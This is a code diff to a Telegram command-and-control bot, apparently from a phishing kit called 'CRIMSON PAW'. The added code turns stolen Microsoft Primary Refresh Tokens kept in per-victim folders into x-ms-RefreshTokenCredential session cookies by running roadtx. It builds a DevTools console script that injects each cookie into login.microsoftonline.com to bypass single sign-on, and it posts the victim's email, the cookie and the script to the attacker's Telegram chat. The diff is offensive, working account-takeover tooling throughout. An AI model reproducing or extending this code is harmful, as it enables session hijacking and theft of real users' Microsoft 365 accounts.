@@ -310,35 +310,78 @@ class TelegramC2BotThread(threading.Thread):
             self._send_text(bot_token, chat_id, f"⚠️ No session found matching user_code <code>{uc}</code>.")
             return
 
-        self._send_text(bot_token, chat_id, f"⏳ Generating RoadTX session cookie for <code>{s.get('victim_email') or uc}</code>...")
+        victim_email = s.get('victim_email') or uc
+        self._send_text(bot_token, chat_id, f"⏳ Generating RoadTX session cookie for <code>{victim_email}</code>...")
 
         try:
-            # Check for existing cookie on disk
-            cookie_path = Path(__file__).resolve().parent / 'victims' / uc / 'cookie.json'
-            if not cookie_path.exists():
-                cookie_path = Path(__file__).resolve().parent / 'victims' / uc / 'cookies.txt'
+            from executor import run_roadtx
+            victim_path = Path(__file__).resolve().parent / 'victims' / uc
+            prt_file = victim_path / 'roadtx.prt'
+            prt_cookie = None
 
-            cookie_bytes = None
-            filename = f"cookie_{uc}.json"
+            if prt_file.exists():
+                raw = run_roadtx(['prtcookie', '-f', str(prt_file.resolve())], str(victim_path.resolve()))
+                if raw:
+                    for line in raw.splitlines():
+                        line = line.strip()
+                        if line.startswith('PRT cookie:'):
+                            prt_cookie = line.replace('PRT cookie:', '').strip()
+                            try:
+                                db.update_session_artifacts(uc, s.get('teams_token'), prt_cookie)
+                            except Exception:
+                                pass
+                            break
 
-            if cookie_path.exists():
-                cookie_bytes = cookie_path.read_bytes()
+            if not prt_cookie:
+                prt_cookie = s.get('prt_cookie')
+
+            if prt_cookie:
+                # Prepare self-executing DevTools Console script
+                js_script = (
+                    "// ================================================================\n"
+                    "// CRIMSON PAW: BROWSER SESSION COOKIE INJECTION SCRIPT\n"
+                    f"// Target: {victim_email} ({uc})\n"
+                    "// Instructions: Open https://login.microsoftonline.com, open\n"
+                    "// DevTools Console (F12), paste this entire code and press Enter.\n"
+                    "// ================================================================\n\n"
+                    "(async () => {\n"
+                    "  const cookieVal = '" + prt_cookie + "';\n"
+                    "  if (typeof cookieStore !== 'undefined') {\n"
+                    "    await cookieStore.set({\n"
+                    "      name: 'x-ms-RefreshTokenCredential',\n"
+                    "      value: cookieVal,\n"
+                    "      domain: 'login.microsoftonline.com',\n"
+                    "      path: '/',\n"
+                    "      sameSite: 'none',\n"
+                    "      secure: true\n"
+                    "    });\n"
+                    "  } else {\n"
+                    "    document.cookie = 'x-ms-RefreshTokenCredential=' + cookieVal + '; domain=.login.microsoftonline.com; path=/; secure; samesite=none';\n"
+                    "  }\n"
+                    "  console.log('%c[CRIMSON PAW] ✓ Session Injected! Reloading...', 'color:#22c55e;font-weight:bold;');\n"
+                    "  location.reload();\n"
+                    "})();\n"
+                )
+
+                # Send rich notification
+                msg = (
+                    f"🍪 <b>SESSION COOKIE HARVESTED!</b>\n\n"
+                    f"• <b>Victim:</b> <code>{victim_email}</code>\n"
+                    f"• <b>User Code:</b> <code>{uc}</code>\n"
+                    f"• <b>Cookie Name:</b> <code>x-ms-RefreshTokenCredential</code>\n"
+                    f"• <b>Status:</b> 🟢 Valid (Ready for SSO Bypass)\n\n"
+                    f"<b>1-Line DevTools Snippet (F12 on login.microsoftonline.com):</b>\n"
+                    f"<pre>await cookieStore.set({{name:'x-ms-RefreshTokenCredential',value:'{prt_cookie}',domain:'login.microsoftonline.com',path:'/',sameSite:'none',secure:true}});location.reload();</pre>\n\n"
+                    f"<i>Complete executable script attached below as a .txt file.</i>"
+                )
+                self._send_text(bot_token, chat_id, msg)
+
+                # Upload document to Telegram chat
+                file_bytes = js_script.encode('utf-8')
+                filename = f"cookie_{uc}.txt"
+                self._send_document(bot_token, chat_id, file_bytes, filename, caption=f"🍪 Injected Session Cookie for {victim_email}")
             else:
-                # Trigger roadtx cookie extraction if PRT exists
-                prt_file = Path(__file__).resolve().parent / 'victims' / uc / 'roadtx.prt'
-                if prt_file.exists():
-                    import subprocess
-                    cmd = f'roadtx prtcookie -f "{prt_file}" -c msteams'
-                    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
-                    if proc.stdout and ('ESTS' in proc.stdout or 'KMSI' in proc.stdout or '{' in proc.stdout):
-                        cookie_bytes = proc.stdout.encode('utf-8')
-                        filename = f"roadtx_cookie_{uc}.txt"
-
-            if cookie_bytes:
-                caption = f"🍪 Session Cookie harvested for {s.get('victim_email') or uc}\nReady for browser injection."
-                self._send_document(bot_token, chat_id, cookie_bytes, filename, caption=caption)
-            else:
-                self._send_text(bot_token, chat_id, f"⚠️ Could not generate fresh cookie for <code>{uc}</code>. PRT assertion may need refresh.")
+                self._send_text(bot_token, chat_id, f"⚠️ PRT file not found for <code>{uc}</code>. Device registration may still be pending.")
         except Exception as e:
             self._send_text(bot_token, chat_id, f"⚠️ Cookie generation error: {e}")
 
